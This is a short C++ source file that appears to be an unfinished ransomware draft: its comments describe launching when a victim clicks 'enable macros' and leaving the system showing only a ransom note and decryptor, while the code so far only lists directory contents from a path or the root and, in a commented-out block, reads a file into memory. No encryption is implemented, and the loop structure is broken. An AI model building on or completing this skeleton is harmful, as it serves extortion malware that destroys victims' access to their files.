#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <openssl/err.h>

using namespace std;

/*
- Execute the program once "enable macros" is clicked
- Let the operative system only display the ransom note and the tools to recover files (decryptor programm)
*/

int main(int argc, const char**argv) {
    struct dirent *entry = nullptr;
    DIR *dp = nullptr;

    dp = opendir(argc > 1 ? argv[1] : "/"); // If nothing entered on args we'll go to root

    // Only browsing by the entry given. Not all the directories on the computer
    if (dp != nullptr) {
        while ((entry = readdir(dp)))
            printf("%s\n", entry->d_name);

        	fstream f;

        	/*FILE * pFile;
  			long lSize;
  			char * buffer;
  			size_t result;

  			pFile = fopen (entry->d_name, "rb" );
  			if (pFile==NULL) {fputs ("File error",stderr); exit (1);}

  			// obtain file size:
  			fseek(pFile, 0, SEEK_END);
  			lSize = ftell (pFile);
  			rewind(pFile);

  			// allocate memory to contain the whole file:
			buffer = (char*) malloc(sizeof(char)*lSize);
			if (buffer == NULL) {fputs("Memory error",stderr); exit (2);}

			// copy the file into the buffer:
			result = fread (buffer,1,lSize,pFile);
			if (result != lSize) {fputs("Reading error",stderr); exit (3);}

			//the whole file is now loaded in the memory buffer

			// terminate
			fclose (pFile);
			free (buffer);*/

    }
    closedir(dp);
    return 0;
} 

